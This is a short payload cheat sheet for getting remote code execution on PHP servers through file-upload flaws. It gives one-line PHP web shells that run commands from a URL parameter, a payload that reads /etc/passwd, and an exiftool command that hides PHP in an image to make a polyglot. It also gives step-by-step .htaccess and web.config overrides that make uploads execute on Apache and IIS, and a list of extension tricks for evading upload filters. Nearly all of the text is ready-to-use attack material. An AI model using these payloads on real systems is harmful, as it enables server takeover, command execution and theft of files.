# PHP Payloads for RCE

## Normal Payloads
```php
<?php echo file_get_contents('/etc/passwd'); ?> >> To read files
<?php system($_GET['cmd']); ?> >> For system command
<?php passthru($_GET['cyborg71']); ?> >> For system command*
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpg -o polyglot.php
```
## Exploiting Server Configuration
___
### Apache Bypass
```
Step 1 >>
filename=".htaccess"
Content-Type: text/plain
AddType application/x-httpd-php .shell
Step 2 >>
Content-Type: application/x-httpd-php
<?php system($_GET['cmd']); ?>
```
### IIS Bypass
```
Step 1 >>
filename="web.config"
Content-Type: text/plain
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap fileExtension=".php" mimeType="application/x-httpd-php" />
        </staticContent>
    </system.webServer>
</configuration>
Step 2 >>
Content-Type: application/x-httpd-php
<?php system($_GET['cmd']); ?>
```
## Obfuscating File Extensions
```
.php
.php3
.php4
.php5
.pHp
.shtml
.php.jpg
.php.png
%2Ephp
.php;.jpg
.php;.png  
.php%00.jpg
.php%00.png
.p.phphp
```
